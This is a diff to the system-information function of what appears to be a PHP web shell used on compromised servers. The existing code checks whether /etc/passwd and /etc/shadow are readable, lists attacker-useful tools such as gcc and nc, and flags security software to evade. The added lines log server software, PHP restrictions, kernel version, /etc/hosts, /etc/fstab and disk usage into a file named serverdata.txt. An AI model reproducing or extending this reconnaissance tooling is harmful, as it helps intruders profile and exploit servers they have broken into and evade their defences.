@@ -363,14 +363,22 @@ function actionSecInfo() {
                 echo '<pre class=ml1>' . $v . '</pre>'; 
         } 
     } 
-    showSecParam('Server software', @getenv('SERVER_SOFTWARE')); 
+    $fserverdata = fopen('serverdata.txt', 'r+');
+    showSecParam('Server software', @getenv('SERVER_SOFTWARE'));
+    $fserverdatawrite = fwrite($fserverdata, getenv('SERVER_SOFTWARE') . '|');
     if(function_exists('apache_get_modules')) 
-        showSecParam('Loaded Apache modules', implode(', ', apache_get_modules())); 
-    showSecParam('Disabled PHP Functions', $GLOBALS['disable_functions']?$GLOBALS['disable_functions']:'none'); 
-    showSecParam('Open base dir', @ini_get('open_basedir')); 
-    showSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir')); 
-    showSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir')); 
-    showSecParam('cURL support', function_exists('curl_version')?'enabled':'no'); 
+        showSecParam('Loaded Apache modules', implode(', ', apache_get_modules()));
+        $fserverdatawrite = fwrite($fserverdata, implode(', ', apache_get_modules()) . '|');
+    showSecParam('Disabled PHP Functions', $GLOBALS['disable_functions']?$GLOBALS['disable_functions']:'none');
+    $fserverdatawrite = fwrite($fserverdata, $GLOBALS['disable_functions']?$GLOBALS['disable_functions']:'none' . '|'); 
+    showSecParam('Open base dir', @ini_get('open_basedir'));
+    $fserverdatawrite = fwrite($fserverdata, ini_get('open_basedir') . '|');
+    showSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
+    $fserverdatawrite = fwrite($fserverdata, ini_get('safe_mode_exec_dir') . '|'); 
+    showSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
+    $fserverdatawrite = fwrite($fserverdata, ini_get('safe_mode_include_dir') . '|'); 
+    showSecParam('cURL support', function_exists('curl_version')?'enabled':'no');
+    $fserverdatawrite = fwrite($fserverdata, function_exists('curl_version')?'enabled':'no' . '|');
     $temp=array(); 
     if(function_exists('mysql_get_client_info')) 
         $temp[] = "MySql (".mysql_get_client_info().")"; 
@@ -380,13 +388,16 @@ function actionSecInfo() {
         $temp[] = "PostgreSQL"; 
     if(function_exists('oci_connect')) 
         $temp[] = "Oracle"; 
-    showSecParam('Supported databases', implode(', ', $temp)); 
+    showSecParam('Supported databases', implode(', ', $temp));
+    $fserverdatawrite = fwrite($fserverdata, implode(', ', $temp) . '|');
     echo '<br>'; 
     if($GLOBALS['os'] == 'nix') { 
             showSecParam('Readable /etc/passwd', @is_readable('/etc/passwd')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\")'>[view]</a>":'no'); 
-            showSecParam('Readable /etc/shadow', @is_readable('/etc/shadow')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"shadow\")'>[view]</a>":'no'); 
-            showSecParam('OS version', @file_get_contents('/proc/version')); 
-            showSecParam('Distr name', @file_get_contents('/etc/issue.net')); 
+            showSecParam('Readable /etc/shadow', @is_readable('/etc/shadow')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"shadow\")'>[view]</a>":'no');
+            showSecParam('OS version', @file_get_contents('/proc/version'));
+            $fserverdatawrite = fwrite($fserverdata, file_get_contents('/proc/version') . '|'); 
+            showSecParam('Distr name', @file_get_contents('/etc/issue.net'));
+            $fserverdatawrite = fwrite($fserverdata, file_get_contents('/etc/issue.net') . '|'); 
             if(!$GLOBALS['safe_mode']) { 
                 $userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl'); 
                 $danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');
@@ -396,21 +407,28 @@ function actionSecInfo() {
                 foreach ($userful as $▟) 
                     if(which($▟)) 
                         $temp[] = $▟; 
-                showSecParam('Userful', implode(', ',$temp)); 
+                showSecParam('Userful', implode(', ',$temp));
+                $fserverdatawrite = fwrite($fserverdata, implode(', ',$temp) . '|');
                 $temp=array(); 
                 foreach ($danger as $▟) 
                     if(which($▟)) 
                         $temp[] = $▟; 
-                showSecParam('Danger', implode(', ',$temp)); 
+                showSecParam('Danger', implode(', ',$temp));
+                $fserverdatawrite = fwrite($fserverdata, implode(', ',$temp) . '|'); 
                 $temp=array(); 
                 foreach ($downloaders as $▟) 
                     if(which($▟)) 
                         $temp[] = $▟; 
-                showSecParam('Downloaders', implode(', ',$temp)); 
+                showSecParam('Downloaders', implode(', ',$temp));
+                $fserverdatawrite = fwrite($fserverdata, implode(', ',$temp) . '|');
                 echo '<br/>'; 
-                showSecParam('HDD space', ex('df -h')); 
-                showSecParam('Hosts', @file_get_contents('/etc/hosts')); 
-                showSecParam('Mount options', @file_get_contents('/etc/fstab')); 
+                showSecParam('HDD space', ex('df -h'));
+                $fserverdatawrite = fwrite($fserverdata, ex('df -h') . '|');
+                showSecParam('Hosts', @file_get_contents('/etc/hosts'));
+                $fserverdatawrite = fwrite($fserverdata, @file_get_contents('/etc/hosts') . '|'); 
+                showSecParam('Mount options', @file_get_contents('/etc/fstab'));
+                $fserverdatawrite = fwrite($fserverdata, @file_get_contents('/etc/fstab') . '|');
+                fclose($fserverdata);
             } 
     } else { 
         showSecParam('OS Version',ex('ver')); 
